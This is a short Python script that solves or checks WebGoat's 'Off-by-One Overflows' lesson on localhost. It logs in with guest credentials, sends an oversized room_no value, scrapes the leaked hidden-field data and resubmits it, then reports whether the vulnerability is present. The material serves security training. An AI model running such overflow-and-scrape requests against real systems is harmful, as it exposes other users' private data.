#!/usr/bin/env python

import requests
import json

proxy = {
  "http": "http://localhost:8888",
  "https": "http://localhost:8888",
}

with requests.Session() as s:
    result = s.get("http://127.0.0.1:8080/WebGoat/login.mvc", proxies=proxy)
    result2 = s.post("http://127.0.0.1:8080/WebGoat/j_spring_security_check", data={"username": "guest", "password": "guest"}, proxies=proxy)
    result = s.get("http://127.0.0.1:8080/WebGoat/attack?Screen=170&menu=100", proxies=proxy)
    result = s.get("http://127.0.0.1:8080/WebGoat/service/lessonmenu.mvc", proxies=proxy)
    for dic in result.json():
        if dic["name"] == "Buffer Overflows":
            for dic2 in dic["children"]:
                if dic2["name"] == "Off-by-One Overflows":
                    result = s.get("http://127.0.0.1:8080/WebGoat/" + dic2["link"], proxies=proxy)
                    result = s.post("http://127.0.0.1:8080/WebGoat/" + dic2["link"], data={"first_name": "hacker", "last_name": "hacker", "room_no": "1"*4097}, proxies=proxy)
                    result = s.post("http://127.0.0.1:8080/WebGoat/" + dic2["link"], data={"price_plan":"%249.99+-+24+hours","SUBMIT": "Accept+Terms","last_name": "hacker", "first_name": "hacker", "room_no": "1"*4097}, proxies=proxy)
                    for line in result.text.split("\n"):
                        if "<input name='d'" in line:
                            firstName = line[line.find("value")+7:-3]
                        if "<input name='e'" in line:
                            lastName = line[line.find("value")+7:-3]
                        if "<input name='f'" in line:
                            roomNumber = line[line.find("value")+7:-3]

                    result = s.get("http://127.0.0.1:8080/WebGoat/" + dic2["link"], proxies=proxy)
                    result = s.post("http://127.0.0.1:8080/WebGoat/" + dic2["link"], data={"first_name": firstName, "last_name": lastName, "room_no": roomNumber}, proxies=proxy)
                    result = s.post("http://127.0.0.1:8080/WebGoat/" + dic2["link"], data={"price_plan":"%249.99+-+24+hours","SUBMIT": "Accept+Terms","last_name": lastName, "first_name": firstName, "room_no": roomNumber}, proxies=proxy)
                    if "Congratulations. You have successfully completed this lesson." in result.text:
                        print "Vulnerability present"
                    else:
                        print "Vulnerability not present"

